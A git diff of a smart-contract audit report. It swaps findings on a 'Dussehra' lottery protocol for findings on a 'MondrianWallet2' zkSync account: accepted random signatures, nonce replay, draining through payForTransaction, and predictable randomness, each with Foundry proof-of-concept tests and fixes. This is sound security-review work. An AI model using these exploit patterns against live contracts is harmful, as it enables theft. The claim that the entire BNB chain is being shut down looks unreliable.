-        address selectedRam;  
-        
-        // the organiser enters the protocol, in additional to player1 and player2.  
-        vm.startPrank(organiser);
-        vm.deal(organiser, 1 ether);
-        dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
-        vm.stopPrank();
-        // check that the organiser owns token id 2:
-        assertEq(ramNFT.ownerOf(2), organiser);
-
-        // player1 and player2 play increaseValuesOfParticipants against each other until one is selected. 
-        vm.startPrank(player1);
-        while (selectedRam == address(0)) {
-            choosingRam.increaseValuesOfParticipants(0, 1);
-            selectedRam = choosingRam.selectedRam(); 
-        }
-        // check that selectedRam is player1 or player2: 
-        assert(selectedRam== player1 || selectedRam == player2); 
-        
-        // But when calling Dussehra.killRavana(), it reverts because isRamSelected has not been set to true.  
-        vm.expectRevert("Ram is not selected yet!"); 
-        dussehra.killRavana(); 
-        vm.stopPrank(); 
-
-        // Let the organiser predict when their own token will be selected through the (not so) random selectRamIfNotSelected function. 
-        uint256 j;
-        uint256 calculatedId; 
-        while (calculatedId != 2) {
-            j++; 
-            vm.warp(1728691200 + j);
-            calculatedId = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao))) % ramNFT.tokenCounter();
-        }
-        // when the desired id comes up, the organiser calls `selectRamIfNotSelected`: 
-        vm.startPrank(organiser); 
-        choosingRam.selectRamIfNotSelected(); 
-        vm.stopPrank();
-        selectedRam = choosingRam.selectedRam();  
-
-        // check that selectedRam is now the organiser: 
-        assert(selectedRam == organiser); 
-        // and we can call killRavana() without reverting: 
-        dussehra.killRavana();  
-    }
-```
-</details>
-
-**Recommended Mitigation:** The simplest mitigation is to set `isRamSelected` to true when a ram is selected through the `increaseValuesOfParticipants` function. 
-
-```diff 
-       } else if (ramNFT.getCharacteristics(tokenIdOfChallenger).isSatyavaakyah == false){
-            ramNFT.updateCharacteristics(tokenIdOfChallenger, true, true, true, true, true);
-+           isRamSelected = true;            
-            selectedRam = ramNFT.getCharacteristics(tokenIdOfChallenger).ram;
-        }
-.
-.
-.
-   } else if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isSatyavaakyah == false){
-        ramNFT.updateCharacteristics(tokenIdOfAnyPerticipent, true, true, true, true, true);
-+       isRamSelected = true;
-        selectedRam = ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).ram;
-    }
-```
-
-Please note that another mitigation would be to delete the `isRamSelected` state variable altogether and have the `RamIsNotSelected` modifier check if `selectedRam != address(0)`. This simplifies the code and reduces chances of errors. This does necessity additional changes to the `Dussehra.sol` contract. 
-
-### [H-6] The `Dussehra` protocol will be deployed, among others, to the `BNB` chain. However, `BNB` is in the process of being decommissioned. From August 2024, it will cease functioning. As the core functionality of the contract is scheduled to take place in October 2024, this will break the contract on the BNB chain. 
-
-**Description:** As explained in [the bnb chain documentation](https://www.bnbchain.org/en/bnb-chain-fusion), the chain will be decommissioned from August 2024 onward. This is before the `Dussehra::killRavana` function can be called.    
-
-**Impact:** The core functionality of the `Dussehra` protocol will not work on the `BNB` chain. 
-
-**Recommended Mitigation:** Replace BNB with another chain (for instance BNC) or focus on the other three chains instead.  
-
-### [H-7] The `Dussehra` protocol will be deployed, among others, to the `zksync`. However, ZkSync is currently transitioning to a new mechanism of calculating `block.timestamp`. This transition will likely continue into October. Zksync documentation notes that during this transition `block.timestamp` should not be used to calculate time. 
-
-**Description:** The [documentation from zksync](https://github.com/zkSync-Community-Hub/zksync-developers/discussions/87) notes that (I added emphasis)
-> The block production rate and timestamp refresh time will be gradually increased during the catch up period.
-> If your project has critical logics that rely on the values returned from block.number, block.timestamp or blockhash you might face unexpected behaviour (e.g. reduced time for governance voting, spike in rewards etc.). These logics could include (non-exhaustive):
-> - [...]
-> - Relying on block.number to calculate when an auction ends or **calculate time**.
-> - [...]
->  
-
-Additionally, please note that transient storage (and related Opcodes TLOAD and TSTORE) are not supported in zkSync. See the the official documentation: https://www.rollup.codes/zksync-era  Both of these are used in the OpenZeppelin v5 that is imported in `RamNFT.sol`. It does not seem to create an issue at the moment (as ERC721 remains unused in `RamNFT`) but could become a problem as the protocol is adapted prior to deployment.
-
-**Impact:** Currently, and into October, block.timestamp on zkSync cannot be used to calculate time or date. It breaks the core functionality of the contract on this chain.
-
-**Recommended Mitigation:** Either completely change the functionality of the protocol, in order for it not to depend on `block.timestamp` for its functionality, or do not deploy to `zksync`. 
-
-## Medium
-### [M-1] The `Dussehra` protocol will be deployed, among others, to the `Arbitrum`. However, `block.timestamp` on the Arbitrum nova L2 chain can be off by as much as 24 hours. This has the potential of breaking the intended functionality of the protocol by shifting the dates at which the `Dussehra::killRavana` function can be called beyond the intended 12 to 13 October 2024 period. 
-
-**Description:** Quoting from [Arbitrum's documentation](https://docs.arbitrum.io/build-decentralized-apps/arbitrum-vs-ethereum/block-numbers-and-time#:~:text=Block%20timestamps%3A%20Arbitrum,in%20the%20future): 
-> Block timestamps on Arbitrum are not linked to the timestamp of the L1 block. They are updated every L2 block based on the sequencer's clock. These timestamps must follow these two rules:
-> 1. Must be always equal or greater than the previous L2 block timestamp
-> 2. Must fall within the established boundaries (24 hours earlier than the current time or 1 hour in the future)." 
-
-This implies that block.timestamps on Arbitrum can be off by up to 24 hours.
-
-**Impact:**  The time that the `Dussehra::killRavana` function can be called can potentially shifts beyond the intended 12 to 13 October 2024 period. 
-
-Related, but more unlikely, if the organiser calls the `ChoosingRam::selectRamIfNotSelected` function through a sequencer that is 24 hours to slow, and subsequently is forced to call `Dussehra::killRavana` through a sequencer that is an hour too fast, the organiser might miss the time window to kill Ravana - breaking the protocol.
-
-**Recommended Mitigation:** Use an off-chain source (for instance Chainlink's Time Based Upkeeps) to initiate (or limit) functions based on time. This is especially important when deploying to L1 and multiple L2 chains, as timestamps will always differ between chains and sequencers.  
-
-### [M-2] Weak checks at the `RamNFT` contract allow the `organiser` to directly set the characteristics of any `ramNFT`. This bypasses the `ChoosingRam::increaseValuesOfParticipants` function and allows the `organiser` to influence who will be selected as Ram. It breaks the intended functionality of the contract. 
-
-**Description:** This weakness unfolds in several steps. 
-1. Weak checks at `RamNFT:setChoosingRamContract` allow the `organiser` to set `choosingRamContract` to any contract address. The `organiser` can do this at any time, also after the `Dussehra` protocol has been deployed. 
-2. Resetting `choosingRamContract` allows the `organiser` to call `RamNFT:updateCharacteristics` through an alternative contract with an alternative functionality.
-3. This alternative contract can, for instance, take a `tokenId` as input and reset characteristics of a ramNFT.
-4. This can result in this tokenId being selected as Ram. 
+1. A malicious user creates a transaction.
+2. The malicious user signs the transaction with a random signature.  
+3. The malicious user calls `MondrianWallet2::executeTransactionFromOutside` with the randomly signed transaction. 
+4. The transaction does not revert and is successfully executed. 
   
-I did not log this as a high vulnerability because the  `selectRamIfNotSelected` function will always reset `selectedRam`. See vulnerability [H-5] above.
-
-```javascript
-    function setChoosingRamContract(address _choosingRamContract) public onlyOrganiser {
-        choosingRamContract = _choosingRamContract;
-    }
-```
-
-**Impact:** By setting characteristics of a ramNFT to true, the protocol can be pushed to select a particular ramNFT as Ram.   
-
-**Proof of Concept:**  As noted, this vulnerability unfolds in several steps: 
-1. The organiser deploys `Dussehra.sol`, `RamNFT.sol` and `ChoosingRam.sol` as usual. 
-2. The organiser sets `choosingRamContract` to `address(ChoosingRam.sol)` by calling `setChoosingRamContract`. 
-3. Participants enter the protocol, including the organiser. So far everything is fine.   
-4. The organiser then creates an alternative contract that calls `selectedRamNFT.updateCharacteristics` and can resets characteristics of a ramNFT.
-5. The organiser changes `choosingRamContract` to the address of the alternative contract. 
-6. The organiser calls a function in the alternative contract and changes the characteristics of their ramNFT to `true`, `true`, `true`, `true`, `false`.  
-7. The organiser changes `choosingRamContract` back to the address of `ChoosingRam.sol`.
-8. The organiser calls `updateCharacteristics` until the last characteristic is turned to `true` and, with it, their ramNFT is selected as Ram. As four out of five characteristics were set to true, the `organiser`'s ramNFT is almost certainly to be selected as Ram.  
-
 <details>
 <summary> Proof of Concept</summary>
 
-Place the following in the `Dussehra.t.sol` test file, below the `CounterTest` contract.  
+Place the following in `ModrianWallet2Test.t.sol`. 
 ```javascript
-    contract OrganiserResetsRamNFTCharacteristics {
-        RamNFT selectedRamNFT;
+    // Please note that you will also need --system-mode=true to run this test. 
+    function testMissingValidateCheckAllowsExecutionUnvalidatedTransactions() public onlyZkSync {
+        // setting up accounts
+        address THIRD_PARTY_ACCOUNT = makeAddr("3rdParty");
+        vm.deal(address(mondrianWallet), AMOUNT);
+        address dest = address(usdc);
+        uint256 value = 0;
+        bytes memory functionData = abi.encodeWithSelector(ERC20Mock.mint.selector, address(mondrianWallet), AMOUNT);
+        Transaction memory transaction = _createUnsignedTransaction(mondrianWallet.owner(), 113, dest, value, functionData);
 
-        constructor(RamNFT _ramNFT) {
-            selectedRamNFT = _ramNFT; 
-        }
+        // Act
+        // we sign transaction with a random signature 
+        bytes32 unsignedTransactionHash = MemoryTransactionHelper.encodeHash(transaction);
+        uint256 RANDOM_KEY = 0x00000000000000000000000000000000000000000000000000000000007ceda5;
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(RANDOM_KEY, unsignedTransactionHash);
+        Transaction memory signedTransaction = transaction;
+        signedTransaction.signature = abi.encodePacked(r, s, v);
 
-        function resetCharacteristics (uint256 tokenId) public {
-            selectedRamNFT.updateCharacteristics(
-                tokenId, true, true, true, true, false
-            ); 
-        }
-    }
-```
-
-Place the following in the `CounterTest` contract of the `Dussehra.t.sol` test file. 
-
-```javascript
-     function test_organiserResetsCharacteristics() public participants {    
-        OrganiserResetsRamNFTCharacteristics resetsAddressesContract; 
-        resetsAddressesContract = new OrganiserResetsRamNFTCharacteristics(ramNFT);
-        address selectedRam = choosingRam.selectedRam(); 
-
-        // the `participants` modifier enters player1 and player2 to the protocol. 
-        assertEq(ramNFT.ownerOf(0), player1);
-        assertEq(ramNFT.ownerOf(1), player2);
-
-        // The organiser also enters as one of the participants, ending up with token id 2.
-        vm.startPrank(organiser);
-        vm.deal(organiser, 1 ether);
-        dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
-        vm.stopPrank();
-        assertEq(ramNFT.ownerOf(2), organiser);
-
-        // Then, the organiser changes the choosingRamContract to the malicious contract: resetsAddressesContract.
-        vm.startPrank(organiser);
-        ramNFT.setChoosingRamContract(address(resetsAddressesContract)); 
-
-        // The contract resetsAddressesContract has a function - as the name suggests - to reset characteristics of a selected tokenId.
-        // in this case token Id 2: the token Id owned by the organiser. 
-        resetsAddressesContract.resetCharacteristics(2); 
-
-        assertEq(ramNFT.getCharacteristics(2).isJitaKrodhah, true);
-        assertEq(ramNFT.getCharacteristics(2).isDhyutimaan, true);
-        assertEq(ramNFT.getCharacteristics(2).isVidvaan, true);
-        assertEq(ramNFT.getCharacteristics(2).isAatmavan, true);
-        assertEq(ramNFT.getCharacteristics(2).isSatyavaakyah, false);
-
-        // the organiser changes the choosingRamContract to back to the correct contract: choosingRam.         
-        vm.startPrank(organiser);
-        ramNFT.setChoosingRamContract(address(choosingRam)); 
-        
-        uint256 i;  
-        while (selectedRam == address(0)) {
-            i++; 
-            vm.warp(1728690000 + i); 
-            choosingRam.increaseValuesOfParticipants(2, 1); 
-            selectedRam = choosingRam.selectedRam(); 
-        }
-        vm.stopPrank(); 
-        // if we increaseValuesOfParticipants between tokenId 1 and 2, is is almost a certainty that tokenId 2 will be selected as Ram, as it started with a huge head start. 
-        vm.assertEq(selectedRam, organiser); 
+        // and the transaction still passes. 
+        vm.prank(THIRD_PARTY_ACCOUNT);
+        mondrianWallet.executeTransactionFromOutside(signedTransaction);
+        assertEq(usdc.balanceOf(address(mondrianWallet)), AMOUNT);
     }
 ```
 </details>
 
-**Recommended Mitigation:** Do not allow the `choosingRamContract` to be changed after initialisation.  
+**Recommended Mitigation:** Add a check, using the result from `_validateTransaction`. Note that when validation succeeds, `_validateTransaction` returns the selector of `IAccount::validateTransaction`. `MondrianWallet2` already imports this value as `ACCOUNT_VALIDATION_SUCCESS_MAGIC`. 
+
+Add a check that `_validateTransaction` returns the value of `ACCOUNT_VALIDATION_SUCCESS_MAGIC`. If the check fails, revert with the error function `error MondrianWallet2__InvalidSignature()`. This error function is already present in `MondrianWallet2.sol`. 
 
 ```diff 
-+    ChoosingRam public immutable choosingRamContract; 
--    ChoosingRam public choosingRamContract; 
-
-+    constructor(address _choosingRamContract) ERC721("RamNFT", "RAM") {
--    constructor() ERC721("RamNFT", "RAM") {
-        tokenCounter = 0; 
-        organiser = msg.sender;
-+       choosingRamContract = ChoosingRam(_choosingRamContract);        
+function executeTransactionFromOutside(Transaction memory _transaction) external payable {
++     bytes4 magic = _validateTransaction(_transaction);
+-     _validateTransaction(_transaction);
++     if (magic != ACCOUNT_VALIDATION_SUCCESS_MAGIC) {
++          revert MondrianWallet2__InvalidSignature();
++    }
+      _executeTransaction(_transaction);
     }
+```
 
--    function setChoosingRamContract(address _choosingRamContract) public onlyOrganiser {
--        choosingRamContract = _choosingRamContract;
+### Missing Access Control on `MondrianWallet2::executeTransaction` allows for breaking of a fundamental invariant of ZKSync: the uniqueness of (sender, nonce) pairs in transactions.   
+
+**Description:** As [the ZKSync documentation](https://staging-docs.zksync.io/build/developer-reference/account-abstraction/design) states: 
+>
+> One of the important invariants of every blockchain is that each transaction has a unique hash. [...] 
+> Even though these transactions would be technically valid by the rules of the blockchain, violating hash uniqueness would be very hard for indexers and other tools to process. [...] 
+> One of the easiest ways to ensure that transaction hashes do not repeat is to have a pair (sender, nonce) always unique. 
+> The following protocol [on ZKSync] is used:
+> - Before each transaction starts, the system queries the NonceHolder to check whether the provided nonce has already been used or not.
+> - If the nonce has not been used yet, the transaction validation is run. The provided nonce is expected to be marked as "used" during this time.
+> - After the validation, the system checks whether this nonce is now marked as used.
+>
+
+In short, for ZKSync to work properly, each transaction that is executed needs to have a unique (sender, nonce) pair. The `MondrianWallet::validateTransaction` function ensures this invariance holds, by increasing the nonce with each validated transaction. 
+
+Usually, the bootloader of ZKSync will always call validate before executing a transaction and check if a transaction has already been executed. However, because in `MondrianWallet2` the owner of the contract can also execute a transaction, they  can choose to execute a transaction multiple times - irrespective if this transaction has already been executed. 
+
+```javascript
+  function executeTransaction(bytes32, /*_txHash*/ bytes32, /*_suggestedSignedHash*/ Transaction memory _transaction)
+```
+
+**Impact:** As the owner of `MondrianWallet2` can execute a transaction multiple times, it breaks of a fundamental invariant of ZKSync: the uniqueness of (sender, nonce) pairs. It can potentially have serious consequences for the functioning of the contract.
+
+**Proof of Concept:** 
+1. A user creates a transaction to mint usdc coins.
+2. The user executes the transaction, with nonce 0. 
+3. The user executes the same transaction - again with nonce 0. 
+4. And again, and again.   
+<details>
+<summary> Proof of Concept</summary>
+
+Place the following in `ModrianWallet2Test.t.sol`. 
+```javascript
+     function testExecuteTransactionBreaksUniquenessNonce() public onlyZkSync {
+        vm.deal(address(mondrianWallet), AMOUNT); 
+        uint256 amoundUsdc = 1e10; 
+        uint256 numberOfRuns = 3; // the number of times to execute a transaction. 
+
+        address dest = address(usdc);
+        uint256 value = 0;
+        bytes memory functionData = abi.encodeWithSelector(ERC20Mock.mint.selector, address(mondrianWallet), amoundUsdc);
+        Transaction memory transaction = _createUnsignedTransaction(mondrianWallet.owner(), 113, dest, value, functionData);
+        transaction = _signTransaction(transaction);
+
+        vm.startPrank(mondrianWallet.owner());
+        for (uint256 i; i < numberOfRuns; i++) {  
+            // the nonce stays at 0.               
+            vm.assertEq(transaction.nonce, 0);
+            // each time the execution passes without problem.  
+            mondrianWallet.executeTransaction(EMPTY_BYTES32, EMPTY_BYTES32, transaction);
+        }
+        vm.stopPrank();
+
+        // this leaves the owner with 3 times the amount of usdc coins - because the contracts has been called three times. With the exact same sender-nonce pair. 
+        assertEq(usdc.balanceOf(address(mondrianWallet)), numberOfRuns * amoundUsdc);
+    } 
+```
+</details>
+
+**Recommended Mitigation:** The simplest mitigation is to only allow the bootloader to call `executeTransaction`. This can be done by replacing the `requireFromBootLoaderOrOwner` modifier with the `requireFromBootLoader` modifier. 
+
+```diff 
+    function executeTransaction(bytes32, /*_txHash*/ bytes32, /*_suggestedSignedHash*/ Transaction memory _transaction)
+        external
+        payable
++        requireFromBootLoader
+
+    function executeTransaction(bytes32, /*_txHash*/ bytes32, /*_suggestedSignedHash*/ Transaction memory _transaction)
+        external
+        payable
+-        requireFromBootLoaderOrOwner
+```
+
+This also allows for the deletion of the `requireFromBootLoaderOrOwner` modifier in its entirety: 
+
+```diff
+-    modifier requireFromBootLoaderOrOwner() {
+-        if (msg.sender != BOOTLOADER_FORMAL_ADDRESS && msg.sender != owner()) {
+-            revert MondrianWallet2__NotFromBootLoaderOrOwner();
+-        }
+-        _;
 -    }
 ```
 
-### [M-3] The address `organiser` at `Dussehra.sol` and the address `organiser` at `RamNFT.sol` have the power to influence and obstruct the functioning of the protocol. As a result, the protocol ends up highly centralised.
-
-**Description:** The address `organiser` is given a lot of power though several functions.   
-1.  `ChoosingRam::selectRamIfNotSelected` gives sole power to the `organiser` to select a Ram. If the organiser does not do this within the set time frame of around one day, the contract breaks and the funds will be stuck in the contract forever. 
-2.  `RamNFT::setChoosingRamContract` allows `organiser` to change `choosingRamContract` and thereby change the `Characteristics` of any ramNFT. See the  vulnerability [M-2] above.  
-3.  There are several ways in which the protocol allows the `organiser` to abuse its power to rug pull participants or break the protocol. See vulnerabilities [H-1], [H-2] and [H-5] above.      
-
-**Impact:** The protocol is susceptible to a rug pull.  
-
-**Recommended Mitigation:** The solution to this problem is not straightforward. But some steps that will help mitigate this issue: 
-1. Improve role restrictions throughout the protocol. The use of OpenZeppelin's `Ownable` or `AccessControl` will already help.  
-2. Improve logic within the protocol to reduce chances of rug pull's. See vulnerabilities [H-1], [H-2] and [H-5] discussed above.
-3. Use multisig wallets for address with high privileged roles. This reduces the chance of one actor abusing its powers.  
 
 
-## Low 
-### [L-1] Due to rounding error in calculation of payout fees in `Dussehra::killRavana`, payout to the organiser and winner can be incomplete, resulting in ether being accumulated in the contract without a means to retrieve it.  
+## Medium
+### When the owner calls the function `MondrianWallet2::renounceOwnership` any funds left in the contract are stuck forever. 
 
-**Description:** Due to rounding error in calculation of payout fees in `Dussehra::killRavana`, payout to the organiser and winner can be incomplete, resulting in ether being accumulated in the contract without a means to retrieve it.  This will occur when the entree fee ends with an odd number and an odd number of participants have entered.  
+**Description:** `MondrianWallet2` inherits the function `renounceOwnership` from openZeppelin's `OwnableUpgradeable`. This function simply transfers ownership to `address(0)`. 
 
+See `OwnableUpgradeable.sol`:
 ```javascript
-  totalAmountGivenToRam = (totalAmountByThePeople * 50) / 100;
+    function renounceOwnership() public virtual onlyOwner {
+        _transferOwnership(address(0));
+    }
 ```
 
-**Impact:** There is a chance that the contract will not payout in full.  
+As is noted in `OwnableUpgradeable.sol`: 
+>
+> NOTE: Renouncing ownership will leave the contract without an owner,
+> thereby disabling any functionality that is only available to the owner.
+>
+
+Making any kind of transaction depends on a signature of the owner. As such, no transactions are possible after the owner renounces their ownership. This includes transfer of funds out of the contract.  
+
+**Impact:** In the life cycle of an Abstracted Account, renouncing ownership is a likely final action. It is very easy to forget to transfer any remaining funds out of the contract before doing so, especially when doing so in an emergency. As such, it is quite likely that funds are left in the contract by accident. 
 
 **Proof of Concept:**
-1. The organiser sets the fee to an odd number (for instance 1 ether + 1); 
-2. An odd number of participants enters the protocol.  
-3. Ravana is killed, and fees are collected. 
-4. The balance of the `Dussehra` is not zero. 
+1. A user deploys `MondrianWallet2` and transfers ownership to their address. 
+2. The user transfers funds into the `MondrianWallet2` account. 
+3. The user renounces ownership and forgets to retrieve funds. 
+4. User's funds are now stuck in the account forever.
+<details>
+<summary> Proof of Concept</summary>
+
+Place the following in `ModrianWallet2Test.t.sol`. 
+```javascript
+    // Please note that you will also need --system-mode=true to run this test. 
+   function testRenouncingOwnershipLeavesEthStuckInContract() public onlyZkSync {
+        vm.deal(address(mondrianWallet), AMOUNT); 
+        address dest = address(usdc);
+        uint256 value = 0;
+        bytes memory functionData = abi.encodeWithSelector(ERC20Mock.mint.selector, address(mondrianWallet), AMOUNT);
+        Transaction memory transaction = _createUnsignedTransaction(mondrianWallet.owner(), 113, dest, value, functionData);
+        transaction = _signTransaction(transaction);
+
+        vm.prank(mondrianWallet.owner()); 
+        mondrianWallet.renounceOwnership();
+
+        vm.prank(ANVIL_DEFAULT_ACCOUNT);
+        vm.expectRevert(MondrianWallet2.MondrianWallet2__NotFromBootLoaderOrOwner.selector);
+        mondrianWallet.executeTransaction(EMPTY_BYTES32, EMPTY_BYTES32, transaction);
+        
+        vm.prank(BOOTLOADER_FORMAL_ADDRESS);  
+        bytes4 magic = mondrianWallet.validateTransaction(EMPTY_BYTES32, EMPTY_BYTES32, transaction);
+        vm.assertEq(magic, bytes4(0));
+    }
+```
+</details>
+
+**Recommended Mitigation:** One approach is to override `OwnableUpgradeable::renounceOwnership` function, adding a transfer of funds to the contract owner when `renounceOwnership` is called. 
+
+Note that it is probably best _not_ to make renouncing ownership conditional on funds having been successfully transferred. In some cases it might be more important to immediately renounce ownership (for instance when keys of an account have been compromised) rather than retrieving all funds from the contract.  
+
+Add the following code to `MondrianWallet2.sol`:  
+```diff 
++   function renounceOwnership() public override onlyOwner {
++      uint256 remainingFunds = address(this).balance;
++      owner().call{value: remainingFunds}("");
++      _transferOwnership(address(0));
++    }
+```
+
+### `MondrianWallet2::payForTransaction` lacks access control, allowing a malicious actor to block a transaction by draining the contract prior to validation. 
+
+**Description:** According to [the ZKsync documentation](https://staging-docs.zksync.io/build/developer-reference/account-abstraction/design#:~:text=in%20a%20block.-,Steps%20in%20the%20Validation,for%20the%20next%20step.,-Execution), the `payForTransaction` function is meant to be called only by the Bootloader to collect fees necessary to execute transactions. 
+
+However, because an access control is missing in `MondrianWallet2::payForTransaction` anyone can call the function. There is also no check on how often the function is called. 
+
+This allows a malicious actor to observe the transaction in the mempool and use its data to repeatedly call payForTransaction. It results in moving funds from `MondrianWallet2` to the ZKSync Bootloader. 
+
+```javascript
+@>  function payForTransaction(bytes32, /*_txHash*/ bytes32, /*_suggestedSignedHash*/ Transaction memory _transaction)
+        external
+        payable
+    {  
+```
+
+**Impact:** When funds are moved from the `MondrianWallet2` to the ZKSync Bootloader, `MondrianWallet2::validateTransaction` will fail due to lack of funds. Also, when the bootloader itself eventually calls `payForTransaction` to retrieve funds, this function will fail. 
+
+In effect, the lack of access controls on `MondrianWallet2::payForTransaction` allows for any transaction to be blocked by a malicious user. 
+
+Please note that[there is a refund of unused fees on ZKsync](https://staging-docs.zksync.io/build/developer-reference/fee-model). As such, it is likely that `MondrianWallet2` will eventually receive a refund of its fees. However, it is likely a refund will only happen after the transaction has been declined.
+
+**Proof of Concept:**
+Due to limits in the toolchain used (foundry) to test the ZKSync blockchain, it was not possible to obtain a fine grained understanding of how the bootloader goes through the life cycle of a 113 type transaction. It made it impossible to create a true Proof of Concept of this vulnerability. What follows is as close as possible approximation using foundry's standard test suite.  
+
+The sequence: 
+1. Normal user A creates a transaction. 
+2. Malicious user B observes the transaction. 
+3. Malicious user B calls `MondrianWallet2::payForTransaction` until `mondrianWallet2.balance < transaction.maxFeePerGas * transaction.gasLimit`. 
+4. The bootloader calls `MondrianWallet::validateTransaction`. 
+5. `MondrianWallet::validateTransaction` fails because of lack of funds. 
+<details>
+<summary> Proof of Concept</summary>
+
+Place the following in `ModrianWallet2Test.t.sol`. 
+```javascript
+    // You'll also need --system-mode=true to run this test
+    function testBlockTransactionByPayingForTransaction() public onlyZkSync {
+        // Prepare
+        uint256 FUNDS_MONDRIAN_WALLET = 1e16; 
+        vm.deal(address(mondrianWallet), FUNDS_MONDRIAN_WALLET); 
+        address THIRD_PARTY_ACCOUNT = makeAddr("3rdParty");
+        
+        // create transaction  
+        address dest = address(usdc);
+        uint256 value = 0;
+        bytes memory functionData = abi.encodeWithSelector(ERC20Mock.mint.selector, address(mondrianWallet), AMOUNT);
+        Transaction memory transaction = _createUnsignedTransaction(mondrianWallet.owner(), 113, dest, value, functionData);
+        transaction = _signTransaction(transaction);
+
+        // using information embedded in the Transaction struct, we can calculate how much fee will be paid for the transaction
+        // and, crucially, how many runs we need to move sufficient funds from the Mondrian Wallet to the Bootloader until mondrianWallet2.balance < transaction.maxFeePerGas * transaction.gasLimit.  
+        uint256 feeAmountPerTransaction = transaction.maxFeePerGas * transaction.gasLimit;
+        uint256 runsNeeded = FUNDS_MONDRIAN_WALLET / feeAmountPerTransaction; 
+        console2.log("runsNeeded to drain Mondrian Wallet:", runsNeeded); 
+
+        // Act 
+        // by calling payForTransaction a sufficient amount of times, the contract is drained.  
+        vm.startPrank(THIRD_PARTY_ACCOUNT); 
+        for (uint256 i; i < runsNeeded; i++) {
+            mondrianWallet.payForTransaction(EMPTY_BYTES32, EMPTY_BYTES32, transaction);
+        }
+        vm.stopPrank();         
+        
+        // Act & Assert 
+        // When the bootloader calls validateTransaction, it fails: Not Enough Balance.   
+        vm.prank(BOOTLOADER_FORMAL_ADDRESS);
+        vm.expectRevert(MondrianWallet2.MondrianWallet2__NotEnoughBalance.selector); 
+        bytes4 magic = mondrianWallet.validateTransaction(EMPTY_BYTES32, EMPTY_BYTES32, transaction);
+    }
+```
+</details>
+
+**Recommended Mitigation:** Add an access control to the `MondrianWallet2::payForTransaction` function, allowing only the bootloader to call the function. 
+
+```diff 
+function payForTransaction(bytes32, /*_txHash*/ bytes32, /*_suggestedSignedHash*/ Transaction memory _transaction)
+        external
+        payable
++       requireFromBootLoader  
+```
+
+### Missing checks on delegate calls allow for all public functions in `MondrianWallet2` to be called via a delegate call. This is not possible in traditional EoAs. It breaks the intended functionality of `MondrianWallet2` as described in its `README.md`. 
+
+**Description:** `MondrianWallet2:README.md` states that: 
+>
+> The wallet should be able to do anything a normal EoA can do, ... 
+>  
+Because it is not a smart contract, a normal EoA cannot have functions that are called via a delegate call. However, all public functions in `MondrianWallet2` lack checks that disallow them to be called via a delegate call. 
+
+See the missing checks in the following functions: 
+```javascript
+  function validateTransaction(bytes32, /*_txHash*/ bytes32, /*_suggestedSignedHash*/ Transaction memory _transaction) external payable requireFromBootLoader
+```
+
+```javascript
+  function executeTransaction(bytes32, /*_txHash*/ bytes32, /*_suggestedSignedHash*/ Transaction memory _transaction) external payable requireFromBootLoaderOrOwner
+```
+```javascript
+  function executeTransactionFromOutside(Transaction memory _transaction) external payable
+```
+
+```javascript
+  function payForTransaction(bytes32, /*_txHash*/ bytes32, /*_suggestedSignedHash*/ Transaction memory _transaction) external payable 
+```
+
+```javascript
+  function prepareForPaymaster( bytes32, /*_txHash*/ bytes32, /*_possibleSignedHash*/ Transaction memory /*_transaction*/ ) external payable 
+```
+
+**Impact:** The lack of checks disallowing functions to be called via a delegate call, breaking the intended functionality of `MondrianWallet2`. 
+
+**Recommended Mitigation:** Create a modifier to check for delegate calls and apply this modifier to all public functions. 
+
+The mitigation below follows the example from `DefaulAccount.sol`, written by Matter Labs (creator of ZKSync). 
+
+```diff 
++  modifier ignoreInDelegateCall() {
++     address codeAddress = SystemContractHelper.getCodeAddress();
++     if (codeAddress != address(this)) {
++         assembly {
++             return(0, 0)
++         }
++     }
++ 
++     _;
++ }
+.
+.
+.
++  function validateTransaction(bytes32, /*_txHash*/ bytes32, /*_suggestedSignedHash*/ Transaction memory _transaction) external payable requireFromBootLoader ignoreInDelegateCall
+-  function validateTransaction(bytes32, /*_txHash*/ bytes32, /*_suggestedSignedHash*/ Transaction memory _transaction) external payable requireFromBootLoader
+.
+.
+.
++  function executeTransaction(bytes32, /*_txHash*/ bytes32, /*_suggestedSignedHash*/ Transaction memory _transaction) external payable requireFromBootLoaderOrOwner ignoreInDelegateCall
+-  function executeTransaction(bytes32, /*_txHash*/ bytes32, /*_suggestedSignedHash*/ Transaction memory _transaction) external payable requireFromBootLoaderOrOwner
+.
+.
+.
++  function executeTransactionFromOutside(Transaction memory _transaction) external payable ignoreInDelegateCall
+-  function executeTransactionFromOutside(Transaction memory _transaction) external payable
+.
+.
+.
++  function payForTransaction(bytes32, /*_txHash*/ bytes32, /*_suggestedSignedHash*/ Transaction memory _transaction) external payable ignoreInDelegateCall
+-  function payForTransaction(bytes32, /*_txHash*/ bytes32, /*_suggestedSignedHash*/ Transaction memory _transaction) external payable
+.
+.
+.
++  function prepareForPaymaster( bytes32, /*_txHash*/ bytes32, /*_possibleSignedHash*/ Transaction memory /*_transaction*/ ) external payable ignoreInDelegateCall
+-  function prepareForPaymaster( bytes32, /*_txHash*/ bytes32, /*_possibleSignedHash*/ Transaction memory /*_transaction*/ ) external payable 
+
+```
+
+### Lacking control on return data at `MondrianWallet2::_executeTransaction` results in excessive gas usage, unexpected behaviour and unnecessary evm errors.
+
+**Description:** The `_executeTransaction` function uses a standard `.call` function to execute the transaction. This function returns a `bool success` and `bytes memory data`. 
+
+However, ZKsync handles the return of this the `bytes data` differently than on Ethereum mainnet. In their own words, from [the ZKsync documentation](https://docs.zksync.io/build/developer-reference/ethereum-differences/evm-instructions#:~:text=thus%2C%20unlike%20evm%20where%20memory%20growth%20occurs%20before%20the%20call%20itself%2C%20on%20zksync%20era%2C%20the%20necessary%20copying%20of%20return%20data%20happens%20only%20after%20the%20call%20has%20ended%2C%20leading%20to%20a%20difference%20in%20msize()%20and%20sometimes%20zksync%20era%20not%20panicking%20where%20evm%20would%20panic%20due%20to%20the%20difference%20in%20memory%20growth.): 
+>
+> unlike EVM where memory growth occurs before the call itself, on ZKsync Era, the necessary copying of return data happens only after the call has ended
+> 
+
+Even though the data field is not used (see the empty space after the comma in `(success,)` below), it does receive this data and build it up in memory  _after_ the call has succeeded. 
+
+```javascript
+  (success,) = to.call{value: value}(data);
+```
+
